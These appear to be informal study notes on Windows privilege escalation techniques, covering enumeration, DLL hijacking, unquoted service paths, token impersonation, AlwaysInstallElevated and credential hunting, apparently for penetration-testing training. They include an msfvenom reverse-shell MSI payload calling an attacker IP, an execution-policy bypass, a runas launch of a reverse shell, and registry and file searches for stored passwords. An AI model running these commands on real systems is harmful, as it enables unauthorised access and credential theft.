here we cover fundamental techniques that can be used to elevate privileges in a Windows environment.

some techniques require extensive enumeration of the target system, you may occasionally see a vulnerable kernel or a file containing cleartext passwords. 

Elevating your privileges may sometimes require you to chain two or more vulnerabilities. 


Windows systems have different user privilege levels.

	Accounts can belong to regular users, who would only have enough privileges to log into the system. Some user levels you will most commonly see are listed below:

	Administrator (local): This is the user with the most privileges.

	Standard (local): These users can access the computer but can only perform limited tasks. Typically these users can not make permanent or essential changes to the system. 

	Guest: This account gives access to the system but is not defined as a user. 

	Standard (domain): Active Directory allows organizations to manage user accounts. A standard domain account may have local administrator privileges. 

	Administrator (domain): Could be considered as the most privileged user. It can edit, create, and delete other users throughout the organization's domain. 


SYSTEM" is not an account in the proper sense. Windows and its services use the "SYSTEM" account to perform their tasks. 

Services installed on a Windows target system can use service accounts and will have a certain level of privilege, depending on the service using them. Service accounts do not allow you to log in but can be leveraged in other ways for privilege escalation.

Windows allows the system administrator to group users to facilitate their management. Any user can be a member of the "Administrator" group, giving it administrator rights on the system. 

Typically, privilege escalation will require you to follow a methodology similar to the one given below: 

Enumerate the current user's privileges and resources it can access.

If the antivirus software allows it, run an automated enumeration script such as winPEAS or PowerUp.ps1

If the initial enumeration and scripts do not uncover an obvious strategy, try a different approach 

------

Information Gathering : 

User Enumeration

Other users that can access the target system can reveal interesting information. A user account named “Administrator” can allow you to gain higher privileges, or an account called “test” can have a default or easy to guess password. Listing all users present on the system and looking at how they are configured can provide interesting information.

The following commands will help us enumerate users and their privileges on the target system.

Current user’s privileges: whoami /priv

List users: net users

List details of a user: net user username (e.g. net user Administrator)

Other users logged in simultaneously: qwinsta (the query session command can be used the same way) 

User groups defined on the system: net localgroup

List members of a specific group: net localgroup groupname (e.g. net localgroup Administrators)

Collecting System Information
-----------------------------

The systeminfo  command will return an overview of the target system.

or 

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

hostname :  some idea about what the system is used for or who the user is.

Searching files
---------------

Configuration files of software installed on the target system can sometimes provide us with cleartext passwords.

some computer users have the unsafe habit of creating and using files to remember their passwords (e.g. passwords.txt). Finding these files can shorten your path to administrative rights or even easy access to other systems and software on the target network.

The findstr command can be used to find such files

findstr /si password *.txt


findstr: Searches for patterns of text in files.

/si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)

password: The command will search for the string “password” in files

*.txt: The search will cover files that have a .txt extension



Patch level
------------

Microsoft regularly releases updates and patches for Windows systems. A missing critical patch on the target system can be an easily exploitable ticket to privilege escalation.

wmic qfe get Caption,Description,HotFixID,InstalledOn  -->  This command can be used to list updates installed on the target system.

Network Connections
-------------------

, we see that some services run locally on a system and can only be accessible locally. 

As we have access to the target system, such services can provide a ticket to a higher privileged user.

The netstat command can be used to list all listening ports on the target system :  netstat -ano

-a: Displays all active connections and listening ports on the target system

-n: Prevents name resolution. 

-o: Displays the process ID using each listed connection.

Any port listed as “LISTENING” that was not discovered with the external port scan can present a potential local service.

If you uncover such a service, you can try port forwarding to connect and potentially exploit it. The port forwarding process will allow tunnelling your connection over the target system, allowing you to access ports and services that are unreachable from outside the target system.

Scheduled Tasks
----------------


Some tasks may be scheduled to run at predefined times. If they run with a privileged account (e.g. the System Administrator account) and the executable they run can be modified by the current user you have, an easy path for privilege escalation can be available.

The schtasks command can be used to query scheduled tasks.

schtasks /query /fo LIST /v

Drivers
-------

drivers allow ourt computer to interact with different hardwares

while os updates are regular , drivers can still be outdated 

use "driverquery" command to list all the available drivers on the target system 

then do some online research that if these drivers can be any helpful for priv esc . 

Antivirus
--------

we shoud detect about the antivirus installed on the target system , antivirus can hamper our situation to esclate or gain privilege 

However, to reach a higher privilege level, you may need to run scripts or other tools on the target system. It is, therefore, good practice to check if any antivirus is present.

Typically, you can take two approaches: looking for the antivirus specifically or listing all running services and checking which ones may belong to antivirus software.


---------------

Tools
-----

1. WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. 

winpeas.exe > outputfile.txt

2. PowerUp

PowerUp is a PowerShell script that searches common privilege escalation on the target system. You can run it with the Invoke-AllChecks option that will perform all possible checks on the target system or use it to conduct specific checks (e.g. the Get-UnquotedService option to only look for potential unquoted service path vulnerabilities).

 To run PowerUp on the target system, you may need to bypass the execution policy restrictions

 powershell.exe -nop -exec bypass : use this command instead

 Import-Module .\PowerUp.ps1

 Invoke-AllChecks

3. Windows Exploit Suggester
Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there.

To avoid making unnecessary noise that can attract attention, you may prefer to use Windows Exploit Suggester, which will run on your attacking machine 

Once installed, and before you use it, type the windows-exploit-suggester.py –update command to update the database.

 run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

 Once this is done, windows-exploit-suggester.py can be run as follows;

windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt

4. Metasploit

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

-------

Privilege Esclation Vectors : 
-----------------------------

1. Vulnerable Software : 

Software installed on the target system can present various privilege escalation opportunities.

 "wmic" to list software installed on the target system and its versions.

 The command below will dump information it can gather on installed software.
 
	wmic product

	You could filter the output to obtain a cleaner output with the command below.
	
	wmic product get name,version,vendor

	, It is worth checking running services using the command below to have a better understanding of the target system.

		wmic service list brief

As the output of this command can be overwhelming, you can grep the output for running services by adding a findstr command as shown below.

wmic service list brief | findstr  "Running"

use sc qc "software_name" for more information about the service

At this point, you have a few options to find any possible privilege escalation exploit that can be used against software installed on the target system.

1. Searchsploit

2. Metasploit

3. Exploit-DB

4. Github

5. Google

-------

2. DLL Hijacking : 

DLL hijacking is an effective technique that can allow you to inject code into an application.

Some Windows executables will use Dynamic Link Libraries (DLLs) when running.

We think of DLLs as files that store additional functions that support the main function of the .exe file.

 In a way, DLLs are executable files, but they can not be run directly like an exe file. They should be launched by other applications (or exe in most cases). If we can switch the legitimate DLL file with a specially crafted DLL file, our code will be run by the application. DLL hijacking requires an application (typically an exe file) that either has a missing DLL file, or where the search order can be used to insert the malicious DLL file.

 Introduction to DLL Files
 -------------------------

 Any application can have its own DLL files but can also call on Windows DLL files.

 . So when the application runs, it will “call” on the dll files for different purposes. 

 missing dll will not always throw errors 

 	critical dll's may cause a application to stop 

 	lesser important ones may not result in visible errors 

 2 conditions are to be met : 

 An application that uses one or more DLL files.

 A way to manipulate these DLL files.

 Manipulating DLL files could mean replacing an existing file or creating a file in the location where the application is looking for it. 

 okay so lets understand how the search for a dll goes on when a executable needs dll 

 there are two scenarios here : 

 1. if SafeDllSearchMode is enabled : 

 a. directory of the application

 b. system directory 

 c. 16-bit system directory 

 d. windows directory 

 e. current directory 

 f. directories listed in path variable , it does not include per app path specified by app path registry key 

 2. if SafeDllSearchMode is disabled : 

 it is mostly same with above just (e.) that is current directory gets interchanged with (b.) system directory

Finding DLL Hijacking Vulnerabilities
-------------------------------------

Identifying DLL Hijacking vulnerabilities will require loading additional tools or scripts to the target system. Another approach could be to install the same application on a test system. However, this may not give accurate results due to version differences or target system configuration.


The tool you can use to find potential DLL hijacking vulnerabilities is Process Monitor (ProcMon). As ProcMon will require administrative privileges to work, this is not a vulnerability you can uncover on the target system. If you wish to check any software for potential DLL hijacking vulnerabilities, you will need to install the software on your test environment and conduct research there.

The second step of the attack will consist of us creating a malicious dll file and put that file in that specific location where the dll is mmissing  The DLL file we will create could be a reverse shell or an operating system command depending on what we want to achieve on the target system or based on configuration limitations

then create a c code to perform the task and compilie it using : 

x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll

then transfer the dll to target , place it in the directory where it is supposed to be and then its all good , just start and stop the service 

--------

3.  Unquoted service path 

When a service starts in Windows, the operating system has to find and run an executable file. 

for example if we launch netlogon service it goes to find : C:\Windows\system32\lsass.exe binary.

 If the path is written between quotes, Windows will directly go to the correct location and launch service.exe. 

 However, if the path is not written between quotes and if any folder name in the path has a space in its name, things may get complicated. Windows will append ".exe" and start looking for an executable, starting with the shortest possible path.

 Knowing this, if we can place an executable in a location we know the service is looking for one, it may be run by the service. 

 As you can understand, exploiting an unquoted service path vulnerability will require us to have write permissions to a folder where the service will look for an executable. 

 Finding Unquoted Service Path Vulnerabilities

Tools like winPEAS and PowerUp.ps1 will usually detect unquoted service paths. But we will need to make sure other requirements to exploit the vulnerability are filled. These are;

1. Being able to write to a folder on the path

2. Being able to restart the service

The command below will list services running on the target system. The result will also print out other information, such as the display name and path. 

wmic service get name,displayname,pathname,startmode

The command may show some Windows operating system folders. As you will not have "write" privileges on those with a limited user, these are not valid candidates.

Once we have located this service, we will have to make sure other conditions to exploit this vulnerability are met.



You can further check the binary path of this service using the command below: 

sc qc unquotedsvc





Once we have confirmed that the binary path is unquoted, we will need to check our privileges on folders in the path. Our goal is to find a folder that is writable by our current user. We can use accesschk.exe with the command below to check for our privileges.

.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"



then just use metasploit to create a reverse shell and also set up metasploit listener and boom we got this 

You can use the sc start unquotedsvc command to start the service. 

-----------

4. Token Impersonation 

service a/c's have higher priveleges , which can be used to authenticate on a listening port of us 

then we do req. negotiation for getting the security token of NT authority system 

then these tokens are used for impersonation

use whoami /priv to see your privileges 

SeImpersonatePrivilege must be present 

use diff. exploits acc. to our situation , some exploits may req. to setup fake servers which are then intercepted to gain that token 

steps involved in this are : 

1. target uses WAPD to connect to update server 

2. req. is intercepted and response is sent to localhost 

3. target asks for a proxy conf. file 

4. malicious file is being sent 

then 

5. target connect to our proxy 

6. our exploit asks target for NTLM auth. 

7. We recieve a NTLM handshake 

8. we futher send NTLM handshake to SMB service requesting to create a process with higher privilege (process can be a reverse shell)

req. are sent and recieved within the target system

our selection of exploit dpeneds on : 

-->system version

-->patch level 

-->network conf. 

--------

Quick Wins : 

schedules task are like cron jobs 

if we can replace or edit a binary the task will run with higher priv 

use "schtasks" to find those tasks 

--------

Always Install Elevated : 

windows installer or msi files are used to install applications on a system 

configure MSI file to use admin privileges 

before doing that just set two registry values 

--> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

--> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

then use msfvenom to create a payload leading to a reverse shell : 

msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

then setup your listener and boom 

------

Passwords : 

look for cleartext passwords or config files 

-----------

Saved Credentials : windows allows users to save their credentials we can list them using : cmdkey /list

you see any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.
runas /savecred /user:admin reverse_shell.exe

----

Registry keys: Registry keys potentially containing passwords can be queried using the commands below.
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

-----------

Unattend files : Unattend.xml files helps system administrators setting up Windows systems.

They need to be deleted once the setup is complete but can sometimes be forgotten on the system.  these files can be wordth reading

------------
   
